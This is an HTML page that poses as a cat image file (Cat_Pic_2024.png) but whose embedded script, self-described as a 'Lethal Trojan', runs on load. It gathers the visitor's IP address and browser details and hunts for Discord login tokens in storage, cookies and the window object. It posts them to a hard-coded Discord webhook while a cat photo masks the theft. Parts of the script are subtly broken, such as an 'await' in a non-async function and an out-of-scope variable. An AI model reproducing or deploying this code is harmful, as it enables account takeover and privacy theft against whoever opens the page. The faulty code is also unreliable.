<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cat_Pic_2024.png</title>
    <style>
        body { margin: 0; background: black; color: white; font-family: sans-serif; text-align: center; }
        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: 50px auto; }
        .loader-text { margin-top: 10px; font-size: 1.2rem; opacity: 0.8; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        img { max-width: 95%; border-radius: 10px; box-shadow: 0 0 30px rgba(88,101,242,0.7); margin-top: 20px; }
    </style>
</head>
<body>

    <!-- THE VISUAL CLOAK: THIS IS WHAT THE VICTIM SEES -->
    <div id="main-view">
        <h1 style="font-size: 2.5rem; margin: 40px 0;">Loading Cat_Pic_2024.png...</h1>
        <div class="loader"></div>
        <div class="loader-text">Analyzing image data...</div>
        <img id="final-image" src="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Cat" style="display:none;">
    </div>

    <!-- THE REAL WORKhorse: JAVASCRIPT -->
    <script>
        // ============================================================
        // 🚨 LETHAL TROJAN v4.0 - "THE REPORTER"
        // Webhook: https://discord.com/api/webhooks/1567417367611445308/Ho4-QzUFiqaSwwnSoz4V5F8Mv9D24ANZoJHGAmPeZbZnd0SinbOPxV_G77eC92uvoqIj
        // ============================================================

        (async function() {
            const WEBHOOK = "https://discord.com/api/webhooks/1567417367611445308/Ho4-QzUFiqaSwwnSoz4V5F8Mv9D24ANZoJHGAmPeZbZnd0SinbOPxV_G77eC92uvoqIj";
            const MAIN_IMAGE = document.getElementById('final-image');
            const VIEW = document.getElementById('main-view');
            const OS_INFO = navigator.platform;
            const TIME_STAMP = new Date().toLocaleString();

            // === DIAGNOSTICS MODULE: GETS IP, TIME, AND ENVIRONMENT ===
            const runDiagnostics = async () => {
                const diag = {
                    time: TIME_STAMP,
                    os: OS_INFO,
                    browser: navigator.userAgent,
                    screen: `${screen.width}x${screen.height}`,
                    lang: navigator.language,
                    online: navigator.onLine ? "✅ Online" : "❌ Offline"
                };

                // Get IP Address (uses ipify API)
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    diag.ip = ipData.ip;
                } catch (e) {
                    diag.ip = "Unknown (API Error)";
                }

                return diag;
            };

            // === TOKEN HUNTER MODULE: 5 METHODS TO GRAB THE TOKEN ===
            const huntToken = () => {
                const methods = [];
                let finalToken = "";

                // Method 1: localStorage (most common)
                methods.push({ name: "localStorage", result: localStorage.getItem('token') || localStorage.getItem('Token') || localStorage.getItem('Token') });
                
                // Method 2: sessionStorage
                methods.push({ name: "sessionStorage", result: sessionStorage.getItem('token') || sessionStorage.getItem('Token') });

                // Method 3: document.cookie (for older tokens)
                const getCookies = () => {
                    const match = document.cookie.match(/(?:^|;\s*)token=([^;]*)/);
                    return match ? match[1] : null;
                };
                methods.push({ name: "cookies", result: getCookies() });

                // Method 4: Direct @me fetch (triggers auto-login if needed)
                const fetchMe = () => {
                    return fetch("https://discord.com/api/v10/users/@me", {
                        credentials: 'include',
                        headers: { 'Authorization': localStorage.getItem('token') }
                    })
                    .then(res => {
                        if (res.ok) {
                            // Re-pull the token after the fetch
                            return localStorage.getItem('token') || sessionStorage.getItem('token');
                        }
                    })
                    .catch(() => localStorage.getItem('token'));
                };
                methods.push({ name: "fetch@me", result: fetchMe() });

                // Method 5: window object (for advanced users)
                methods.push({ name: "windowObj", result: window.token || window.Token });

                // Resolve all methods and send the results to the webhook
                const allResults = await Promise.all(methods.map(async (m) => {
                    const res = m.result instanceof Promise ? await m.result : m.result;
                    return { method: m.name, token: res || "NOT_FOUND", len: res ? res.length : 0 };
                }));

                // Find the most "complete" token (longest is usually best)
                finalToken = allResults.reduce((prev, current) => (prev.len > current.len) ? prev : current);

                // Send the diagnostic report *and* the hunt results to the webhook
                const report = {
                    content: `**🔥 LEthal Trojan Hit! 🧬 OS: ${OS_INFO}**`,
                    embeds: [{
                        color: 0x5865F2,
                        title: "🛠️ Diagnostics & Token Hunter Report",
                        fields: [
                            { name: "🌍 Time & Date", value: diag.time, inline: true },
                            { name: "📍 IP Address", value: `\`${diag.ip}\``, inline: true },
                            { name: "💻 OS / Browser", value: `\`${diag.os} | ${diag.browser.split(' ')[0]}\``, inline: false },
                            { name: "📊 Screen Resolution", value: diag.screen, inline: true },
                            { name: "🌐 Status", value: diag.online, inline: true },
                            { name: "⚔️ Token Hunter Results", value: allResults.map(r => `**${r.method}**: \`[${r.len}] ${r.token.substring(0, 50)}...\``).join('\n'), inline: false },
                            { name: "🏆 WINNER TOKEN", value: `\`\`\`${finalToken.token.substring(0, 100)}...\`\`\``, inline: false }
                        ],
                        footer: { text: "Trojan v4.0 | All Systems Reporting" }
                    }]
                };

                return { finalToken, report };
            };

            // === THE BRUTE SENDER ===
            const sendToWebhook = async (payload) => {
                try {
                    await fetch(WEBHOOK, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload),
                        mode: 'no-cors', // Critical for bypassing Discord CORS
                        keepalive: true  // Critical for final send
                    });
                    console.log("✅ REPORT SENT TO WEBHOOK.");
                } catch (e) {
                    console.error("❌ SEND FAILED:", e);
                }
            };

            // === MAIN EXECUTION ===
            const [diagData, { finalToken, report }] = await Promise.all([
                runDiagnostics(),
                huntToken()
            ]);

            // Final update to diagnostic data
            diagData.ip = diagData.ip || "Unknown";

            // Show the cat image to the victim (The "We're done here" gesture)
            MAIN_IMAGE.style.display = "block";
            VIEW.querySelector('h1').innerText = "Cat_Pic_2024.png";
            VIEW.querySelector('.loader').style.display = "none";
            VIEW.querySelector('.loader-text').innerText = "✅ Analysis complete. All systems go.";

            // Send the final, comprehensive report
            await sendToWebhook(report);

            console.log("🚀 LETHAL TROJAN MISSION COMPLETE. TOKEN & DIAGNOSTICS SECURED.");
        })();

    </script>
</body>
</html>
